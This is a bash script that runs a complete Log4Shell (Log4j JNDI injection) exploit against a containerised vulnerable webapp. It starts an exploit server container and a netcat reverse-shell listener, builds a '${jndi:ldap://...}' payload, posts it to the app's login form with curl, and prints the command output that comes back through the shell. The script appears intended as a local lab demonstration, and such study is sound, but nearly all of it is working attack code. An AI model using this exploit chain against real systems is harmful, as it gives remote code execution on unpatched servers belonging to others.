#!/bin/bash
if [ -z $1 ]
then echo "Please give me the local IP which is reachable from dockerland (eth0 or ensX on host)"
exit;
fi

docker run --rm -p 8080:8080 -d dockerbadboy/log4j_vulnerable_webapp 
echo "whoami" | nc -l 9001 &> ./netcat_out &
docker run --rm -p 8000:8000 -p 1389:1389 -d dockerbadboy/log4j_pwner python3 poc.py --userip $1
LDAP='uname=${jndi:ldap://'$1':1389/a}'
echo $LDAP
curl_cmd='curl -d '\'${LDAP}\'' -H "Content-Type: application/x-www-form-urlencoded" http://'$1':8080/login'
echo $curl_cmd
sleep 3
bash -v -c "$curl_cmd" &
sleep 1
echo '$$$$$$$$$'
cat ./netcat_out
echo '$$$$$$$$$'
sleep 1
killall nc
rm ./netcat_out
